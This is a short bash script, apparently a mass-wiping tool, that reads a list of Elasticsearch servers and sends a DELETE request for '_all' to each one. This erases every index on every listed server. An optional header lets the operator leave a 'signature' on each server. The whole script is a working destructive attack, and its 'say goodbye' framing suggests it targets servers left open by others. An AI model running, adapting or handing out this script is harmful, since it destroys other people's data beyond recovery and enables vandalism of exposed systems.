#!/bin/bash
echo "[*] Starting SalamES.sh to salam (say goodbye) to ElasticSearch servers."

if [ $# -eq 0 ] || [ $# -gt 2 ]
  then
    echo "[!] Incorrect number of arguments provided."
    echo "[!] - You must provide at least a text file with the servers to salam (one per line)."
    echo "[!] - A(n optional) header can be added as a signature/mark."
    exit 400
fi

echo "[*] Reading file: $1"
echo "[*] Signature to be added: $2"
while IFS='' read -r server || [[ -n "$server" ]]; do
    echo "[*] Deleting $server..."
    answer=$(curl -XDELETE $server/_all --header \"$2\")
    echo "[*] Answer received: $answer"
done < "$1"
echo "[*] Process ended."
